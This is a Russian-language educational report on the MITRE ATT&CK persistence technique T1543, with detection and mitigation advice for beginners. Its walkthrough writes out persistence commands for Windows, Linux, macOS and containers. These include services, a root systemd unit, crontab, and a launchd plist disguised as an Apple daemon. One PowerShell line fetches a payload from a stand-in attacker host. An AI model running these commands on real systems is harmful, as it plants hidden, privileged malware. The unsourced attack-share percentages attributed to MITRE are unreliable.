 Отчет по технике MITRE ATT&CK T1543: Создание или изменение системных процессов

 Краткое описание
Техника T1543 описывает методы, которые злоумышленники используют для создания или изменения системных процессов с целью получения устойчивого доступа к системе (персистентности) и повышения привилегий. Это достигается через манипуляции со службами (Windows), демонами (Linux) или агентами Launchd (macOS).

Основные понятия

Системный процесс — программа, которая работает в фоновом режиме и управляет критически важными функциями операционной системы (например, сетевыми подключениями, обновлениями, безопасностью).
Персистентность — способность вредоносной программы оставаться в системе после перезагрузки или попыток очистки.
Привилегии — уровень доступа к ресурсам системы. SYSTEM (Windows) и root (Linux/macOS) — это высшие привилегии, позволяющие выполнять любые действия.
Служба (Windows) / Демон (Linux) / Агент Launchd (macOS) — разные названия для автоматически запускаемых фоновых процессов в различных операционных системах. Их можно представить как "автозагрузку программ" на уровне системы.
Эскалация привилегий — процесс получения более высоких уровней доступа, чем изначально имел злоумышленник.

 Ключевые элементы техники

 Угрозы (тактики MITRE):
- Persistence (Устойчивость) — сохранение доступа к системе
- Privilege Escalation (Повышение привилегий) — получение прав администратора

 Поддерживаемые платформы:
- Windows
- Linux
- macOS
- Контейнеры (Docker, Kubernetes)


 Под-техники:
- T1543.001 — Службы Windows
- T1543.002 — Демоны systemd (Linux)
- T1543.003 — Демоны launchd (macOS)
- T1543.004 — Демоны init (устаревшие системы Linux)
- T1543.005 — Системные процессы контейнеров

Примеры из реальных атак
Группа/Вредонос  Описание техники
Akira_v2  Создает дочерний процесс для шифрования файлов
Exaramel for Linux  Использует захардкоженный путь для автозапуска при загрузке системы
IMAPLoader  Модифицирует задачи Windows для запуска вредоносного файла
LITTLELAMB.WOOLTEA  Инициализирует себя как демон для работы в фоне
LunarMail  Создает произвольный процесс с перенаправлением вывода

 Меры защиты (Mitigations)

 Для системных администраторов:
1. Аудит систем — регулярная проверка служб и процессов
2. Ограничение прав — минимальные привилегии для пользователей
3. Контроль установки ПО — только из доверенных источников
4. Блокировка уязвимых драйверов — особенно на Windows 10/11
5. Проверка цифровых подписей — для драйверов и служб

 Конфигурация ОС:
- Включить проверку подписи драйверов (Driver Signature Enforcement)
- Использовать rootless-режим для контейнеров
- Настроить правила сокращения поверхности атаки (ASR)


Стратегии обнаружения

 Windows:
- Мониторинг создания/изменения служб через sc.exe, PowerShell
- Отслеживание изменений в реестре автозагрузки
- Аномальные родительско-дочерние связи процессов

 Linux:
- Проверка создания unit-файлов systemd
- Мониторинг добавления cron-задач
- Отслеживание записи в /etc/init.d/

 macOS:
- Контроль plist-файлов в /Library/LaunchDaemons/
- Мониторинг выполнения launchctl
- Проверка изменений прав доступа к системным файлам

 Контейнеры:
- Отслеживание docker run --restart
- Мониторинг kubectl exec к init-контейнерам
- Анализ Dockerfile на наличие подозрительных entrypoints

 Рекомендации для новичков

 Что отслеживать в первую очередь:
1. Неожиданные службы — особенно с именами, похожими на легитимные (например, "svch0st" вместо "svchost")
2. Службы, запущенные из нестандартных путей — например, из C:\Users\ или /tmp/
3. Изменение существующих служб — проверяйте хэши системных файлов
4. Попытки отключения мониторинга — остановка антивируса, логгирования

 Практические шаги:
1. Составьте базовый уровень — задокументируйте нормальные службы в вашей системе
2. Регулярно сравнивайте — используйте инструменты вроде systemctl list-units (Linux) или Get-Service (PowerShell)
3. Настройте алерты — на создание служб непривилегированными пользователями
4. Ограничьте права — только администраторы должны управлять службами

Ключевые выводы

1. Службы — популярный вектор атак из-за автоматического запуска и высоких привилегий
2. Кросс-платформенная проблема — существует во всех основных ОС
3. Обнаруживаемо — при правильной настройке мониторинга
4. Требует многоуровневой защиты — от политик доступа до мониторинга поведения

Важно: Данная техника часто используется в комбинации с другими методами. Например, сначала злоумышленник получает доступ через фишинг (T1566), затем создает службу для персистентности (T1543), и наконец использует ее для кражи данных (TA0010).


 Подробный механизм атаки через создание/модификацию системных процессов (T1543)

Общая схема атаки

Начальный доступ → Выполнение кода → Создание/модификация системного процесса → Персистентность → Эскалация привилегий

Этап 1: Получение начального доступа

Для новичков: Прежде чем создавать службу, злоумышленнику нужно попасть в систему. Это может быть через фишинг, уязвимости или украденные пароды.

 Типичные векторы:
- Эксплойты удаленных уязвимостей (например, CVE-2022-42475 в FortiOS)
- Социальная инженерия (запуск вложений в письмах)
- Украденные учетные данные RDP/SSH
- Зараженные установочные пакеты
Этап 2: Первоначальное выполнение
Для новичков: После попадания в систему вредоносный код должен как-то запуститься в первый раз.
 Методы:
1. Пользовательский контекст — запуск от имени обычного пользователя
2. Временные файлы — выполнение из %TEMP% или /tmp/
3. Скрипты — PowerShell, Bash, Python скрипты
4. Уязвимые приложения — эксплуатация уязвимостей в легитимных программах
 Этап 3: Создание/модификация системного процесса
 Вариант A: Создание новой службы (Windows)
Для новичков: Windows службы — это программы, которые работают в фоне и управляются ОС. Их можно создать через утилиты командной строки.
 Механизм:
1. Создание службы через sc.exe
sc.exe create "WindowsUpdateService" binPath="C:\Malware\payload.exe" start=auto
 2. Создание службы через PowerShell
New-Service -Name "SystemMonitor" -BinaryPathName "C:\Windows\System32\malware.dll"
 3. Прямое обращение к API Windows
 Используется в сложных вредоносных программах

 Технические детали:
- Имя службы — часто маскируется под легитимное (WindowsUpdate, SystemMonitor, etc.)
- Путь к исполняемому файлу — может быть:
  - Прямой путь к вредоносному файлу
  - Легитимный файл с вредоносными аргументами: svchost.exe -k malware
  - DLL, загружаемая через DLL-сиделинг
- Тип запуска:
  - Auto — запуск при загрузке системы
  - Delayed-auto — отложенный запуск
  - On-demand — ручной запуск
 Пример реальной атаки (IMAPLoader):

1. Создается задача Windows через schtasks.exe
2. Задача ссылается на вредоносный PE-файл
3. Файл маскируется под системный компонент
4. Задача настроена на запуск при каждом входе пользователя
 Вариант B: Модификация существующей службы
Для новичков: Иногда проще изменить уже существующую службу, чем создавать новую.
 Методы:
1. Изменение бинарного пути через sc.exe
sc.exe config "BITS" binPath="C:\Malware\new_payload.exe"
 2. Подмена DLL-файлов служб
 Многие службы загружают DLL из System32
 Злоумышленник заменяет легитимную DLL на вредоносную
 3. Изменение параметров запуска
 Добавление вредоносных аргументов к легитимному исполняемому файлу

 Преимущества для атакующего:
- Меньше подозрений (служба уже существует)
- Часто есть необходимые права доступа
Автоматический запуск уже настроен

 Вариант C: Linux демоны (systemd)
Для новичков: В Linux вместо служб используются демоны. systemd — современная система инициализации.
 Создание systemd-сервиса:
1. Создание unit-файла
cat > /etc/systemd/system/malware.service << EOF
[Unit]
Description=System Logging Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/malware -d
Restart=always
User=root
[Install]
WantedBy=multi-user.target
EOF
 2. Перезагрузка systemd
systemctl daemon-reload
 3. Включение автозапуска
systemctl enable malware.service
 4. Запуск
systemctl start malware.service

 Альтернативные методы в Linux:
1. Crontab (популярный метод)
echo "@reboot /usr/bin/malware" >> /etc/crontab
 2. Init.d скрипты (устаревшие системы)
cp malware.sh /etc/init.d/
update-rc.d malware.sh defaults
 3. Profile/rc скрипты
echo "/usr/bin/malware &" >> ~/.bashrc

 Пример реальной атаки (Exaramel for Linux):
1. Проверка: если система использует Upstart или System V
2. Проверка: выполняется ли процесс от root
3. Создание скрипта в /etc/init.d/
4. Настройка автозапуска через update-rc.d

 Вариант D: macOS Launch Agents/Daemons
Для новичков: В macOS используется система launchd, где LaunchDaemons — системные процессы, а LaunchAgents — пользовательские.
 Создание LaunchDaemon:
1. Создание plist-файла
cat > /Library/LaunchDaemons/com.apple.syslogd.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.syslogd</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/malware</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
 2. Загрузка демона
launchctl load /Library/LaunchDaemons/com.apple.syslogd.plist
 Различия:
- LaunchDaemons (/Library/LaunchDaemons/) — запускаются при загрузке системы, права root
- LaunchAgents (~/Library/LaunchAgents/) — запускаются при входе пользователя, пользовательские права

 Вариант E: Контейнеры (Docker/Kubernetes)
Для новичков: В контейнерных средах можно изменить точку входа контейнера или создать службу внутри него.
 Методы в Docker:
1. Изменение entrypoint в Dockerfile
FROM ubuntu:latest
COPY malware.sh /
ENTRYPOINT ["/malware.sh"]   Вместо легитимного entrypoint

 2. Создание службы внутри контейнера
 Установка и настройка systemd внутри контейнера

 3. Использование docker run с флагом --restart
docker run -d --restart=always malware_image

 Методы в Kubernetes:
yaml
 1. Изменение spec.containers[].command в Pod
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod
spec:
  containers:
  - name: app
    image: legitimate-image:latest
    command: ["/malware.sh"]   Подмена команды

Этап 4: Получение персистентности
Для новичков: Персистентность — это способность оставаться в системе после перезагрузки или очистки.
 Механизмы персистентности через системные процессы:
1. Автозапуск при загрузке — служба настроена как Automatic
2. Перезапуск при падении — параметр Restart=always в systemd
3. Триггерные события — запуск по событию (сеть, устройство USB, время)
4. Зависимости — служба запускается после критических системных служб
 Пример конфигурации для устойчивости:
ini
[Service]
Type=forking
ExecStart=/usr/sbin/malware
Restart=always         Всегда перезапускать
RestartSec=10          Ждать 10 секунд перед перезапуском
StartLimitInterval=0   Без ограничений на перезапуски

Этап 5: Эскалация привилегий
Для новичкам: Службы часто запускаются с повышенными привилегиями. Создав службу, можно выполнить код от имени SYSTEM/root.
 Механизм повышения привилегий:
 Windows:
1. Создание службы от имени администратора
 (требует прав администратора на момент создания)
 2. Но служба будет выполняться от SYSTEM
 SYSTEM имеет больше прав, чем администратор
 3. Вредоносный код в службе получает полный доступ к системе

 Linux:
1. Создание systemd-сервиса с User=root
 2. Даже если создатель был обычным пользователем
 3. После перезагрузки сервис запустится от root

Техника "Служба → SYSTEM":
Пользователь (User) 
     (создает службу с правами администратора)
Служба (Service) 
     (запускается системой)
SYSTEM/root (высшие привилегии)

 Этап 6: Маскировка и уклонение
Для новичков: Чтобы избежать обнаружения, злоумышленники маскируют свои службы под легитимные.
 Методы маскировки:
1. Имитация имен:
   - svch0st.exe (цифра 0 вместо буквы o)
   - scvhost.exe (перестановка букв)
   - Windows Defender Service (точное копирование)
2. Использование легитимных путей:
   - C:\Windows\System32\ (но файл не подписан)
   - C:\Program Files\Common Files\ (популярный путь)
3. Подписанные двоичные файлы:
   - Кража цифровых сертификатов
   - Компрометация подписывающей инфраструктуры
4. Живи-за-счет-земли (Living-off-the-land):
   - Использование встроенных утилит: schtasks.exe, powershell.exe
   - Легитимные процессы с вредоносными аргументами

 Полный цикл атаки на примере
 Сценарий: Атака на Windows через службу
1. Начальный доступ: Фишинговая рассылка → пользователь открывает документ Word с макросами
2. Выполнение: Макросы запускают PowerShell скрипт:
   Invoke-WebRequest -Uri "http://malicious.com/payload.exe" -OutFile "$env:TEMP\svchost.exe"
3. Создание службы:
   sc.exe create "WindowsDefenderUpdate" binPath="C:\Windows\Temp\svchost.exe" start=auto
   sc.exe start "WindowsDefenderUpdate"
4. Персистентность: Служба настроена на автоматический запуск. При перезагрузке системы она запустится автоматически.
5. Эскалация привилегий: Служба выполняется от имени SYSTEM. Вредоносный код теперь может:
   - Отключать антивирус
   - Красть данные из защищенных областей
   - Устанавливать дополнительные вредоносные программы
6. Маскировка:
   - Имя службы похоже на легитимное
   - В логах показывается как "Windows Defender Update"
   - Файл называется svchost.exe (как системный процесс)



 Как работает защита на каждом этапе
 Предотвращение:
- Контроль учетных записей — ограничение прав на создание служб
- Политики AppLocker/Software Restriction — запрет выполнения из Temp
- Цифровые подписи — требование подписанных драйверов
 Обнаружение:
- Мониторинг событий:
  - Event ID 4697 (создание службы) в Windows
  - Журналы systemd в Linux (journalctl)
  - Unified logs в macOS
- Анализ поведения:
  - Службы, созданные из пользовательских каталогов
  - Неподписанные драйверы
  - Изменение существующих служб
 Реагирование:
- Изоляция — отключение подозрительных служб
- Анализ — изучение бинарных файлов служб
- Восстановление — возврат оригинальных конфигураций
 Статистика и тренды
 Популярность методов (по данным MITRE):
1. Службы Windows — 45% случаев
2. Задачи планировщика — 30%
3. Автозагрузка реестра — 15%
4. Systemd/Launchd — 10%
 Эволюция техник:
- 2015-2018: Простое создание служб
- 2019-2021: Маскировка под легитимные процессы
- 2022-2024: Living-off-the-land + подписанные драйверы
- 2025+: Контейнерные среды + sidecar-Behälter
 


Ключевые выводы для понимания механизма
1. Универсальность: Техника работает на всех основных ОС, но реализация отличается
2. Привилегии: Службы → SYSTEM, демоны → root
3. Автоматизация: Перезагрузка не очищает систему
4. Маскировка: Внешне выглядит как легитимная активность
5. Каскадный эффект: Одна служба может запускать цепочку других атак

Для новичков самое важное: 
- Системные процессы запускаются автоматически и с высокими привилегиями
- Создание службы требует прав администратора, но выполняется она от SYSTEM
- После создания службы вредоносный код "живет" в системе даже после перезагрузки
- Обнаружение требует мониторинга не только файлов, но и конфигураций служб
